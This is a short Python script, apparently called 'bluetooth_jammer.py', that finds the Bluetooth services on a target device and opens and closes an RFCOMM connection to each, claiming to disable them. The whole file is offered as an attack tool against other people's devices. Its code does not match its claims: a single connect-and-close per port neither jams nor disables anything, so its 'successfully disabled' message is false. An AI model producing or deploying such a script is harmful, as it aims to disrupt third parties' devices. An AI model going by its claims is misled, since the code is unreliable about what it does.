import bluetooth
import time
import sys

def jam_bluetooth(device_address):
    try:
        service_matches = bluetooth.find_service(address=device_address)

        if len(service_matches) == 0:
            print("No services found on the target device.")
            return

        for service in service_matches:
            port = service["port"]
            name = service["name"]
            host = service["host"]

            print(f"Disabling Bluetooth service '{name}' on host '{host}'")

            s = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            s.connect((host, port))
            s.close()

        print("Bluetooth services successfully disabled.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python bluetooth_jammer.py <device_address>")
        sys.exit(1)

    device_address = sys.argv[1]
    jam_bluetooth(device_address)
